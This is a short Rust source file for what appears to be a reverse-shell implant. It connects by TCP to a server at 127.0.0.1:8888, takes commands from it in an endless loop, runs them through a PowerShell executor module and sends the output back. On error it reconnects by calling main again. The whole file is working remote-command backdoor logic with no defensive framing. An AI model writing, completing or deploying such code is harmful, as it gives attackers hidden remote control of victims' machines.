mod power_shell_executor;
mod tcp_connector;


fn main() {
    let ip_address: String = String::from("127.0.0.1:8888");

    match tcp_connector::connect_to_ip_address(&ip_address)  {
        Ok(stream) => {
            println!("Connected");
            loop {
                match tcp_connector::read_from_server(&stream) {
                    Ok(result_from_server) => {
                        println!("Got from server - {}", &result_from_server);
                        if result_from_server == "CHECK" {
                             continue;
                        }
                        let result = power_shell_executor::execute(&result_from_server);

                        tcp_connector::send_to_server(&stream, &result);
                    }
                    Err(_) => {
                        main()
                    }
                }
            }
        }
        Err(e) => {
            println!("Failed to connect to {} - {}", ip_address, e)
        }
    }
}
